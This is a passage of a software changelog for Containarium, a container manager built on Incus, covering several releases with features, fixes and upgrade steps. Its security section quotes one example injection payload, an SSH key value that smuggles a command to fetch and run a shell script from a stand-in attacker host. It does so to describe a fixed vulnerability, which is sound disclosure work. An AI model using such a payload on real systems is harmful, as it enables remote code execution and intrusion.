  - PostgreSQL schema migration adds `has_sudo` and `has_container_runtime` columns
  - Web UI: checkboxes in Add Collaborator form, permission badges (sudo/docker chips) in collaborator table
  - CLI: `containarium collaborator add alice bob --ssh-key bob.pub --sudo --container-runtime`
- **Docker CE software stack** — proper Docker installation as a stack option
  - New `docker` stack in `configs/stacks.yaml` with Docker CE apt repository setup
  - Installs `docker-ce`, `docker-ce-cli`, `containerd.io`, `docker-compose-plugin`
  - Automatically adds user to `docker` group when docker stack is selected
  - Web UI: Docker Development option in stack selection dropdown
- **Stack pre-install commands** — `pre_install` field in Stack struct for commands that run as root before `apt-get install` (e.g., adding apt repositories)
- **Daemon config persistence in PostgreSQL** for self-bootstrapping after VM recreation
  - New `daemon_config` key-value table stores: `base_domain`, `http_port`, `grpc_port`, `listen_address`, `enable_mtls`, `enable_rest`, `enable_app_hosting`
  - Auto-detect PostgreSQL container IP from Incus (`containarium-core-postgres`) — no `--postgres` flag needed
  - On startup, loads saved config from DB; CLI flags always override DB values (`cmd.Flags().Changed()`)
  - On successful start, saves current config back to DB for next boot
  - New `DaemonConfigStore` in `internal/app/daemon_config_store.go` with `Get`, `Set`, `GetAll`, `SetAll` methods
  - Systemd service reduced from 6 flags to 2: `--rest --jwt-secret-file /etc/containarium/jwt.secret`
  - JWT secret intentionally kept out of PostgreSQL (remains on filesystem)
- **`containarium service install` command** for single-command systemd service setup
  - Writes the canonical service file with correct `ReadWritePaths` (includes `/var/lock` for useradd flock)
  - Generates JWT secret file if it doesn't exist
  - Enables and starts the service automatically
  - Replaces inline heredocs in `hacks/install.sh`, `terraform/gce/scripts/startup.sh`, and `startup-spot.sh`
  - Also: `containarium service status` and `containarium service uninstall`
- **AppServer graceful degradation** — `/v1/apps` returns empty list instead of 501 when app hosting is disabled
- Collaborator management for containers (add/remove/list collaborators)

### Fixed
- **Route domain doubling in Caddy**: Routes with independent FQDNs (e.g., `api.kafeido.app`) were incorrectly getting the base domain appended (`api.kafeido.app.containarium.kafeido.app`), causing TLS and routing failures. Fixed `ProxyManager.addRouteWithProtocol()` to only append base domain for simple subdomains (no dots), leaving FQDNs as-is.
- **Routes API returning empty when app-hosting disabled**: The `/v1/network/routes` endpoint returned no routes because the standalone route store (created when `--app-hosting` is off) was never assigned to `NetworkServer`. Routes existed in PostgreSQL and synced to Caddy correctly, but the API couldn't serve them.
- **Route sync loop churning every 5 seconds**: The domain doubling bug caused a perpetual add/remove cycle (`+4 added, -4 removed` every tick) because Caddy's doubled domains never matched PostgreSQL's correct domains.
- **Useradd lock file on read-only filesystem**: `flock /var/lock/containarium-useradd.lock` failed with `ProtectSystem=strict` because `/var/lock` was not in `ReadWritePaths`. Now included in the canonical service template.
- Force remove agent when creating user container
- Persist Caddy route records into PostgreSQL as single source of truth
- Startup deadlock

## [0.6.0] - 2026-02-15

### Added

#### Software Stack Selection
- New `--stack` flag for `containarium create` command to install pre-configured software stacks
- Available stacks: `nodejs`, `python`, `golang`, `rust`, `datascience`, `devops`, `database`, `fullstack`
- Stack definitions in `configs/stacks.yaml` with APT packages and post-install commands
- New `internal/stacks` package for loading and managing stack configurations
- Web UI: Stack selection dropdown in Create Container dialog with descriptions
- Proto: Added `stack` field to `CreateContainerRequest` and `Container` messages
- Each stack installs relevant packages and tools during container creation:
  - **nodejs**: Node.js LTS, npm, yarn, pnpm, TypeScript
  - **python**: Python 3, pip, virtualenv, poetry
  - **golang**: Go, gopls, golangci-lint
  - **rust**: Rust toolchain via rustup
  - **datascience**: Python with Jupyter, pandas, numpy, scikit-learn
  - **devops**: kubectl, Terraform
  - **database**: PostgreSQL, MySQL, Redis CLI clients
  - **fullstack**: Node.js + Python + database clients

#### Port Forwarding CLI Commands
- New `containarium portforward` command group for managing iptables port forwarding rules
- `containarium portforward show` - Display current PREROUTING/POSTROUTING rules and IP forwarding status
- `containarium portforward setup --caddy-ip <IP>` - Setup port forwarding rules for Caddy
- `containarium portforward setup --auto` - Auto-detect Caddy container IP from Incus
- `containarium portforward remove --caddy-ip <IP>` - Remove port forwarding rules
- Automatic port forwarding setup when daemon starts with `--app-hosting` enabled

#### Event-Driven Architecture (SSE)
- New Server-Sent Events (SSE) endpoint at `/v1/events/subscribe` for real-time updates
- Event types for containers: created, deleted, started, stopped, state changed
- Event types for apps: deployed, deleted, started, stopped, state changed
- Event types for routes: added, deleted
- Central event bus (`internal/events/bus.go`) with pub/sub pattern
- Type-safe event emission via `Emitter` interface
- Frontend `useEventStream` hook with automatic reconnection and heartbeat handling
- 15-second SSE heartbeat to prevent proxy timeouts
- Removes need for polling in Web UI - instant updates on state changes

#### Dashboard CPU Load Metrics
- Added real-time CPU load display to the System Resources dashboard
- Shows 1-minute load average with progress bar visualization
- Displays load as "X.XX / N cores" format for easy interpretation
- Color-coded utilization: green (<60%), yellow (60-80%), red (>80%)
- Backend reads load averages from `/proc/loadavg`
- New proto fields: `cpu_load_1min`, `cpu_load_5min`, `cpu_load_15min` in SystemInfo

#### Disaster Recovery Command
- New `containarium recover` command for restoring containers after instance recreation
- Supports two modes:
  - **Explicit mode**: Specify parameters via CLI flags
    ```bash
    containarium recover \
      --network-cidr 10.0.3.1/24 \
      --zfs-source incus-pool/containers
    ```
  - **Config mode**: Load from persistent storage config file
    ```bash
    containarium recover --config /mnt/incus-data/containarium-recovery.yaml
    ```
- Recovery process handles:
  1. Network creation (incusbr0 with correct CIDR)
  2. Storage pool import via `incus admin recover`
  3. Default profile configuration (eth0 device)
  4. Starting all recovered containers
  5. Syncing SSH jump accounts via `sync-accounts`
- Recovery config is automatically saved to persistent storage during daemon startup
- Supports `--dry-run` flag to preview recovery actions

#### Per-Container Traffic Monitoring
- New Traffic tab in Web UI for connection-level network monitoring
- Real-time connection tracking using Linux conntrack via netlink
- View active TCP/UDP connections per container with:
  - Source/destination IP and port
  - Protocol and connection state (ESTABLISHED, TIME_WAIT, etc.)
  - Bytes sent/received with live counters
  - Connection direction (INGRESS/EGRESS)
  - Duration and timeout information
- Connection summary showing aggregate stats:
  - Active connection counts (total, TCP, UDP)
  - Total bytes sent/received
  - Top destinations by connection count and bandwidth
- Real-time updates via Server-Sent Events (SSE)
- Historical connection persistence in PostgreSQL
- REST API endpoints:
  - `GET /v1/containers/{name}/connections` - List active connections
  - `GET /v1/containers/{name}/connections/summary` - Get connection summary
  - `GET /v1/containers/{name}/traffic/history` - Query historical connections
  - `GET /v1/containers/{name}/traffic/aggregates` - Get time-series aggregates
- gRPC streaming: `SubscribeTraffic` for real-time connection events
- Container IP to name resolution via cache with periodic refresh
- New proto definitions in `traffic.proto` (Connection, TrafficEvent, etc.)
- New `internal/traffic/` package:
  - `conntrack_linux.go` - Linux netlink conntrack implementation
  - `collector.go` - Event coordination and caching
  - `store.go` - PostgreSQL persistence
  - `server.go` - TrafficService gRPC implementation
  - `cache.go` - Container IP mapping

#### Network Route Management
- Added route management UI to Network tab in Web UI
- Add/Delete proxy routes through the web interface
- Domain dropdown shows existing TLS-enabled routes from Caddy
- Target IP dropdown shows running containers with name and IP
- Routes managed via Caddy Admin API for dynamic configuration
- New API endpoint: `GET /v1/network/dns-records` for domain suggestions

#### gRPC Proxy Support
- Added protocol selection (HTTP/gRPC) when creating proxy routes
- gRPC routes use HTTP/2 (h2c) transport for backend communication
- Caddy reverse proxy automatically configured with correct protocol handling
- New `RouteProtocol` enum in proto: `ROUTE_PROTOCOL_HTTP`, `ROUTE_PROTOCOL_GRPC`
- Protocol field added to `ProxyRoute`, `AddRouteRequest`, `UpdateRouteRequest`
- Web UI shows protocol column in routes table (HTTP/gRPC chip)
- Protocol selector dropdown in Add Route dialog
- Backend support via `NewGRPCTransport()` and `AddGRPCRoute()` in proxy manager

#### TCP/UDP Passthrough Routes
- Added passthrough route support for direct TCP/UDP port forwarding via iptables
- Ideal for mTLS gRPC services where TLS should not be terminated at proxy
- Unified routes view in Web UI showing both proxy and passthrough routes
- Route type selector in Add Route dialog: Proxy (TLS terminated) vs Passthrough (direct)
- New proto definitions: `RouteType` enum, `PassthroughRoute` message
- New `RouteProtocol` values: `ROUTE_PROTOCOL_TCP`, `ROUTE_PROTOCOL_UDP`
- REST API endpoints:
  - `GET /v1/network/passthrough` - List passthrough routes
  - `POST /v1/network/passthrough` - Add passthrough route
  - `DELETE /v1/network/passthrough/{external_port}` - Delete passthrough route
- Backend `PassthroughManager` in `internal/network/portforward.go` for iptables management
- Web UI visual distinction: Proxy routes (🌐) vs Passthrough routes (🔌)

#### Automatic TLS Certificate Provisioning
- New `ProvisionTLS()` method in ProxyManager for automatic SSL certificate provisioning
- When adding a route, Caddy automatically obtains a TLS certificate for the domain
- Adds domain to Caddy's TLS automation policy with ACME (Let's Encrypt) and ZeroSSL issuers
- Graceful fallback: if TLS provisioning fails, route is still added (may use wildcard cert)
- See [docs/TLS-PROVISIONING.md](docs/TLS-PROVISIONING.md) for detailed documentation

#### Disaster Recovery Command
- See [docs/DISASTER-RECOVERY.md](docs/DISASTER-RECOVERY.md) for detailed documentation

### Changed

#### Docker to Podman Migration
- **BREAKING**: Replaced Docker with Podman as the container runtime inside LXC containers
- Renamed proto fields: `enable_docker` → `enable_podman`, `docker_enabled` → `podman_enabled`
- Updated CLI flag: `--docker` → `--podman` (default: true)
- Updated Web UI: "Enable Docker" checkbox → "Enable Podman" checkbox
- **Podman 5.x from Kubic repository**: Uses OpenSUSE Kubic unstable repository for latest Podman versions (5.x) instead of Ubuntu's default (4.9.x)
- **podman-compose via pip**: Installs podman-compose from PyPI for latest version instead of apt package
- Podman provides Docker-compatible CLI (`podman` commands work like `docker`)
- Note: Dockerfile naming kept as standard (works with both Docker and Podman)

- Dashboard "CPU Cores" section renamed to "CPU Load" with usage visualization
- Route management moved from Apps tab to Network tab exclusively
- `RemoveRoute` now properly extracts subdomain from full domain for deletion
- Added fallback deletion by route index when routes lack `@id` field
- **Auto-detect Caddy container IP**: When `--app-hosting` is enabled and `--caddy-admin-url` is not specified, the daemon automatically finds a running container with "caddy" in its name and uses its IP for the Caddy Admin API (e.g., `http://10.0.3.111:2019`)
- **Type-safe Caddy API**: Refactored `proxy.go` to use strongly-typed structs instead of `map[string]interface{}` for Caddy API interactions. New types include `CaddyRouteTyped`, `CaddyReverseProxyHandler`, `CaddyTLSAutomationPolicy`, `CaddyTLSIssuer`, and helper functions like `NewTLSPolicy()` and `NewReverseProxyRoute()`

### Fixed
- Fixed route deletion when full domain is passed instead of subdomain
- Fixed routes created via Caddyfile not being deletable (missing @id)
- Fixed WebUI static files not being embedded correctly after build
- **Fixed port forwarding blocking container outbound HTTPS**: iptables PREROUTING rules now exclude the entire container network CIDR (`! -s 10.x.x.0/24`) instead of just Caddy's IP. This allows all containers to access external HTTPS services (Docker Hub, Let's Encrypt, etc.)
- Fixed route display showing `ip:port:0` format by properly parsing Caddy's `Dial` field into separate IP and port fields

## [0.5.0] - 2026-02-10

### Security
- **CRITICAL: Fixed shell injection via SSH key content** (`internal/container/manager.go`)
  - Malicious SSH keys could execute arbitrary commands inside containers
  - Attack vector: `ssh-ed25519 AAAA' && curl evil.com/shell.sh | bash && echo '`
  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
- **CRITICAL: Fixed shell injection in sudoers setup** (`internal/container/manager.go`)
  - Similar pattern to SSH key injection, mitigated by username validation
  - Fix: Replaced shell `echo` command with Incus `WriteFile()` API
- **CRITICAL: Fixed WebSocket terminal missing authentication** (`internal/gateway/gateway.go`)
  - Unauthenticated users could open shell sessions by not providing a token
  - Fix: Made token validation mandatory (returns 401 if no token provided)
- **CRITICAL: Fixed CORS allowing all origins** (`internal/gateway/gateway.go`)
  - CORS was configured with `*` allowing any website to make API requests
  - Fix: Restricted to localhost by default, configurable via `CONTAINARIUM_ALLOWED_ORIGINS` env var
- **CRITICAL: Fixed WebSocket origin validation always returning true** (`internal/gateway/terminal.go`)
  - Combined with missing auth, any webpage could open terminal sessions
  - Fix: Validates origin against allowed list, rejects requests without Origin header
- **Fixed non-expiring JWT tokens allowed** (`internal/auth/token.go`)
  - `--expiry 0` created tokens that never expired
  - Fix: Enforced maximum 30-day expiry (configurable via `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS`)
- **Fixed hardcoded developer username path** (`internal/container/manager.go`)
  - Removed `/home/hsinhoyeh` from SSH key fallback paths (information leak)
- **Fixed hardcoded private key path in Terraform** (`terraform/gce/main.tf`)
  - Replaced hardcoded path with `ssh_private_key_path` variable
- **Added checksum verification to install script** (`scripts/install-mcp.sh`)
  - Downloads and verifies SHA256 checksum before installation

### Added
- **Security Test Suite** - Comprehensive tests for security-critical code
  - `internal/auth/token_test.go` - JWT token expiry enforcement tests
  - `internal/gateway/security_test.go` - CORS and WebSocket origin validation tests
  - `internal/container/security_test.go` - Shell injection prevention tests
- **New Environment Variables**:
  - `CONTAINARIUM_ALLOWED_ORIGINS` - Comma-separated list of allowed CORS/WebSocket origins
  - `CONTAINARIUM_MAX_TOKEN_EXPIRY_HOURS` - Maximum JWT token expiry in hours (default: 720)
- **New Terraform Variable**:
  - `ssh_private_key_path` - Path to SSH private key for provisioner connections
- **Container Label Management** - Kubernetes-style labels for organizing containers
  - CLI commands for label operations:
    - `containarium label set <username> key=value [key2=value2...]` - Set labels on a container
    - `containarium label remove <username> <key> [key2...]` - Remove labels from a container
    - `containarium label list <username>` - List all labels on a container
  - List command enhancements:
    - `--show-labels` flag to display labels in container list
    - `--label key=value` flag to filter containers by label
    - `--group-by <label-key>` flag to group containers by label value
  - REST API endpoints:
    - `GET /v1/containers/{username}/labels` - Get container labels
    - `PUT /v1/containers/{username}/labels` - Set container labels
    - `DELETE /v1/containers/{username}/labels/{key}` - Remove a label
  - Labels stored in Incus config with `user.containarium.label.` prefix
- **Web UI Label Features**
  - Label editor dialog for adding/removing labels on containers
  - Label edit button (tag icon) in both Grid View and List View
  - Labels displayed as chips in List View
  - "Group by" dropdown to organize containers by label key
  - Grouped view shows containers in sections with label value headers

## [0.4.0] - 2026-01-25

### Added
- **Web UI Enhancements** - Improved container management dashboard
  - Grid/List view toggle for containers (switch between card grid and table views)
  - System Resources Card showing overall CPU cores, memory usage, and storage usage
  - Per-container disk quota display (current usage / total quota with progress bars)
  - Demo page with mock data at `/webui/demo` for UI preview
- **App Hosting Feature** - Deploy web applications with automatic HTTPS
  - `containarium app deploy` - Deploy apps from source directory
  - `containarium app list` - List deployed applications
  - `containarium app logs` - View application logs
  - `containarium app stop/start/restart` - Lifecycle management
  - `containarium app delete` - Remove applications
  - Auto-detection for 7 languages: Node.js, Python, Go, Rust, Ruby, PHP, Static
  - Buildpack system generates Dockerfiles automatically
  - PostgreSQL storage for app metadata
  - Subdomain-based routing (e.g., `username-appname.containarium.dev`)
- **Auto-Provisioned Core Services** - Infrastructure containers managed by Containarium
  - `containarium-core-postgres` - PostgreSQL container for app metadata storage (2 CPU, 2GB RAM, 10GB disk)
  - `containarium-core-caddy` - Caddy reverse proxy container for TLS termination (1 CPU, 512MB RAM, 5GB disk)
  - Automatically created on daemon startup with `--app-hosting` flag
  - Core containers use static IPs and are excluded from user container listings
  - Self-healing: containers are recreated if missing or stopped
- **Caddy Reverse Proxy Integration** - Automatic TLS with DNS-01 challenge
  - Wildcard certificate support for `*.containarium.dev`
  - Dynamic route configuration via Caddy Admin API
  - Setup script: `scripts/setup-caddy.sh`
  - Supports 8 DNS providers: Cloudflare, Route53, Google Cloud DNS, DigitalOcean, Azure, Vultr, DuckDNS, Namecheap
  - Documentation: `docs/CADDY-SETUP.md`
- **Docker-in-Docker Privileged Mode** - Full Docker support inside containers
  - `EnableDockerPrivileged` option for container creation
  - Automatically sets `security.privileged=true` and `raw.lxc=lxc.apparmor.profile=unconfined`
  - Required for Docker builds to work inside Incus containers
- **New daemon flags for App Hosting**:
  - `--app-hosting` - Enable app hosting feature
  - `--postgres` - PostgreSQL connection string
  - `--base-domain` - Base domain for app subdomains (default: `containarium.dev`)
  - `--caddy-admin-url` - Caddy admin API URL (default: `http://localhost:2019`)
- **ProxyManager unit tests** - 9 test cases for Caddy API integration
- **Auto-initialization of Incus infrastructure** on daemon startup
  - Automatically creates storage pool (`default` with `dir` driver)
  - Automatically creates network bridge (`incusbr0`)
  - Automatically configures default profile with network and storage devices
  - Safe default subnet: `10.100.0.1/24` (avoids conflicts with common networks like 10.0.0.0/8)
- **Network subnet configuration** via `--network-subnet` flag
  - Customize container network subnet (default: `10.100.0.1/24`)
  - Example: `containarium daemon --network-subnet 192.168.50.1/24`
- **Skip infrastructure initialization** via `--skip-infra-init` flag
  - Useful when infrastructure is already configured manually
  - Example: `containarium daemon --skip-infra-init`
- **New Incus client methods** for infrastructure management:
  - `EnsureNetwork()` - Create network if not exists
  - `EnsureStorage()` - Create storage pool if not exists
  - `EnsureDefaultProfile()` - Configure default profile
  - `InitializeInfrastructure()` - One-call setup for all infrastructure
  - `GetNetworkSubnet()` - Get configured subnet for a network
- **HTTP/REST client for CLI** - Alternative to gRPC for remote server communication
  - `--http` flag to use HTTP/REST API instead of gRPC
  - `--token` flag for JWT authentication token
  - Supports all CLI commands: `create`, `list`, `delete`, `info`
  - Example: `containarium list --server http://host:8080 --http --token <JWT>`
- **Web UI server management with localStorage persistence**
  - Server configurations (URL, name, token) stored in browser localStorage
  - Persists across browser sessions until explicitly removed
  - Add Server dialog with connection testing
  - Edit server via pencil icon on server tab
  - Remove server via X icon on server tab
  - Multi-server support with tab-based switching
- **SSH public key input in Web UI** - Option to provide your own SSH public key
  - Uncheck "Auto-generate SSH key pair" to reveal public key input field
  - Paste existing SSH public key instead of auto-generating

### Changed
- CLI now supports both gRPC and HTTP protocols equally (neither marked as deprecated)
- Server address flag help text updated to reflect dual-protocol support

### Fixed
- **Disk quota not showing in API response** - Fixed `toProtoContainer()` to include disk size in `ResourceLimits` struct, previously only CPU and memory were being returned
- **Network/Routes 500 errors** - Fixed nil pointer issues when Caddy proxy is not configured
- **Node.js buildpack `npm ci` failure** - Fixed Dockerfile generation to use `npm install --omit=dev` when `package-lock.json` is missing, falls back to `npm ci --omit=dev` when lock file exists
- **PostgreSQL timestamp encoding** - Fixed `deployedAt` field type from `*interface{}` to `*time.Time` for proper database encoding
- **Caddy server name mismatch** - Fixed ProxyManager to use `srv0` (Caddyfile default) instead of hardcoded `main`, now configurable via `SetServerName()`
- **Docker AppArmor permission denied** - Added privileged mode and AppArmor unconfined profile for Docker-in-Docker support
- **Network subnet conflicts** - Previously manual network setup could conflict with host network
  - Auto-initialization uses safe default `10.100.0.1/24` instead of common `10.0.3.0/24`
  - Prevents loss of connectivity when running Containarium inside LXC containers

## [0.3.0] - 2026-01-15

### Added
- **Web UI Dashboard** - Modern browser-based container management interface
  - Real-time container metrics (CPU, Memory, Disk usage with progress bars)
  - Multi-server management with tab-based interface
  - Container lifecycle management (create, start, stop, delete)
  - Browser-based terminal access via WebSocket
  - Client-side SSH key generation (keys never sent to server)
  - Embedded in Go binary for single-file deployment
  - Available at `/webui/` endpoint
- **Container Metrics API** - Real-time resource monitoring
  - CPU usage percentage calculation
  - Memory and disk usage with limits
  - Network I/O statistics
  - Process count per container
- **WebSocket Terminal** - Browser-based container shell access
  - Direct terminal access without SSH client
  - Runs as container user via Incus exec
  - JWT token authentication via query parameter
- **Makefile improvements**:
  - `make webui` - Build Next.js web UI for embedding
  - `make clean-ui` - Clean swagger-ui and webui files
  - `make clean-all` - Clean all artifacts including UI
- **REST API support via grpc-gateway** - HTTP/JSON API alongside existing gRPC
  - All 10 container management endpoints exposed via REST
  - Dual-protocol support: gRPC (port 50051) + REST (port 8080)
  - Backward compatible - existing gRPC clients unaffected
- **JWT token authentication** for REST API
  - Bearer token authentication with configurable expiry
  - Token generation command: `containarium token generate`
  - Support for token secret files (`--jwt-secret-file`)
  - Roles-based authorization support
- **Interactive Swagger UI** for API exploration
  - Available at `/swagger-ui/` endpoint
  - CDN fallback for zero-setup experience
  - Embedded files support for offline use
- **OpenAPI specification generation**
  - Automatic OpenAPI/Swagger spec generation from proto files
  - Available at `/swagger.json` endpoint
  - Comprehensive API documentation with examples
- **Enhanced daemon command** with new REST flags:
  - `--rest` - Enable/disable REST API (default: true)
  - `--http-port` - Configure REST API port (default: 8080)
  - `--jwt-secret` / `--jwt-secret-file` - Configure JWT authentication
  - `--swagger-dir` - Swagger files directory
- **Complete upgrade system** for the entire Containarium stack:
  - `containarium upgrade self` - Upgrade Containarium binary from GitHub releases
  - `containarium upgrade host` - Upgrade host dependencies (Incus, system packages, kernel modules)
  - `containarium upgrade containers` - Upgrade software inside containers (Docker, base OS, tools)
  - `containarium upgrade all` - Upgrade everything in the correct order
- **Changelog display** during upgrades - shows release notes before upgrading
- **Runtime version checking** with warnings for outdated components
- **Rolling upgrades** for containers (`--rolling` flag) to minimize downtime
- **Reboot detection** - automatically detects if system reboot is required after upgrade
- **Mock server** for local testing of upgrade commands (`test/mock-server.py`)
- **Test fixtures** for upgrade testing without needing real releases

### Fixed
- Docker build support by requiring Incus 6.19+ (fixes CVE-2025-52881 AppArmor bug)
- Terraform startup scripts now install Incus from Zabbly repository
- All Terraform startup scripts updated for Incus 6.19+
- Fixed typo in proto package name: `continariumv1` → `containariumv1`
- **JWT secret handling** - Fixed trailing newline issues when reading JWT secrets from files
- **Gateway mTLS connection** - Fixed HTTP gateway to properly connect to gRPC server with mTLS
- **Installation script (`hacks/install.sh`)** - Multiple critical fixes:
  - Fixed Incus package conflict by adding APT pinning to prioritize Zabbly repository over Ubuntu
  - Added `--batch --yes` flags to GPG commands for non-interactive SSH installation
  - Changed `incus-tools` to `incus-extra` (newer package name in Zabbly repository)
  - Fixed systemd service permissions (`ProtectSystem=false`, `ProtectHome=false`)
  - Added automatic TLS certificate generation step for mTLS
- **Google Guest Agent race condition** - Fixed `/etc/passwd` lock conflicts during user creation
  - Stop google-guest-agent → remove stale locks → create user → restart agent
  - Prevents "cannot lock /etc/passwd; try again later" errors
- **Container creation improvements**:
  - Fixed image format parsing to support both `ubuntu:24.04` and `images:ubuntu/24.04` formats
  - Fixed SSH directory creation (`.ssh` not created before writing `authorized_keys`)
  - Added `--force` flag to delete and recreate existing containers
- **StopContainer API** - Fixed to use proper API field (`Force: true`) instead of string action

### Changed
- Updated documentation with Incus 6.19+ system requirements
- Renamed `upgrade incus` to `upgrade host` for better clarity (includes more than just Incus)
- Upgrade commands now provide detailed progress and status information
- Proto generation now includes grpc-gateway and OpenAPI plugins

### Security
- JWT-based authentication for REST API with configurable token expiry
- Bearer token validation middleware
- CORS support with configurable origins
- Preserved mTLS authentication for gRPC (unchanged)

## [0.2.0] - 2025-01-12

### Added
- Container resize command (`containarium resize`) for dynamic resource adjustment
  - Resize CPU, memory, and disk without downtime
  - Advanced CPU options: range allocation and core pinning
- mTLS (mutual TLS) support for daemon API
  - Certificate generation command (`containarium cert generate`)
  - Client certificate authentication
  - Secure remote management
- Comprehensive documentation for resize functionality
- Remote gRPC daemon for container management
- Production deployment examples with Terraform

### Security
- Added mTLS authentication for daemon API
- SSH hardening in jump server configuration
- Fail2ban integration for brute-force protection

### Infrastructure
- Terraform modules for GCE deployment
- Support for spot instances with persistent storage
- ZFS-backed storage for disk quotas
- Hyperdisk support for C4 instance types

---

## Upgrade Instructions

### Upgrading from 0.1.x to 0.2.0

**Important:** This version requires Incus 6.19 or later for Docker build support.

1. Upgrade Incus on your host:
   ```bash
   # Add Zabbly repository
   curl -fsSL https://pkgs.zabbly.com/key.asc | sudo gpg --dearmor -o /usr/share/keyrings/zabbly-incus.gpg
   echo 'deb [signed-by=/usr/share/keyrings/zabbly-incus.gpg] https://pkgs.zabbly.com/incus/stable noble main' | sudo tee /etc/apt/sources.list.d/zabbly-incus-stable.list
   sudo apt update
   sudo apt install --only-upgrade incus incus-tools incus-client
   ```

2. Upgrade Containarium binary:
   ```bash
   curl -fsSL https://github.com/FootprintAI/Containarium/releases/download/0.2.0/containarium-linux-amd64 -o /tmp/containarium
   sudo install -m 755 /tmp/containarium /usr/local/bin/containarium
   sudo systemctl restart containarium  # if running as daemon
   ```

3. Verify versions:
   ```bash
   incus --version     # Should show 6.19 or later
   containarium version
   ```

---

## Version History

- **v0.10.0** (2026-03-09) - Monitoring stack (VictoriaMetrics + Grafana + OTel), disk cleanup, stop container, passthrough persistence
- **0.9.1** (2026-02-28) - Boot disk validation fix for production
- **0.9.0** (2026-02-28) - Terraform Module Consolidation, single source of truth for dev and production
- **0.8.2** (2026-02-28) - sshpiper SSH reverse proxy on sentinel
- **0.8.1** (2026-02-27) - Preemption recovery fix, PostgreSQL retry, sentinel iptables fix, role-based container labeling
- **0.8.0** (2026-02-27) - Sentinel TLS Cert Sync, Status Page, Management SSH, Sentinel Design Doc
- **0.7.0** (2026-02-25) - Collaborator Permissions, Docker CE Stack, Service Install, Daemon Config Persistence
- **0.6.0** (2026-02-15) - Per-Container Traffic Monitoring, Docker to Podman Migration
- **0.5.0** (2026-02-10) - Security Hardening Release (5 critical fixes)
- **0.4.0** (2026-01-25) - App Hosting, Auto-Provisioned Core Services, Network Topology
- **0.3.0** (2026-01-15) - Web UI Dashboard, Container Metrics, WebSocket Terminal
- **0.2.0** (2025-01-12) - Resize command, mTLS support, production readiness
- **0.1.0** (Initial release) - Basic container management, SSH jump server

[v0.10.0]: https://github.com/FootprintAI/Containarium/compare/0.9.1...v0.10.0
[0.9.1]: https://github.com/FootprintAI/Containarium/compare/0.9.0...0.9.1
[0.9.0]: https://github.com/FootprintAI/Containarium/compare/0.8.2...0.9.0
[0.8.2]: https://github.com/FootprintAI/Containarium/compare/0.8.1...0.8.2
[0.8.1]: https://github.com/FootprintAI/Containarium/compare/0.8.0...0.8.1
[0.8.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.8.0
[0.7.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.7.0
[0.6.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.6.0
[0.5.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.5.0
[0.4.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.4.0
[0.3.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.3.0
[0.2.0]: https://github.com/FootprintAI/Containarium/releases/tag/0.2.0
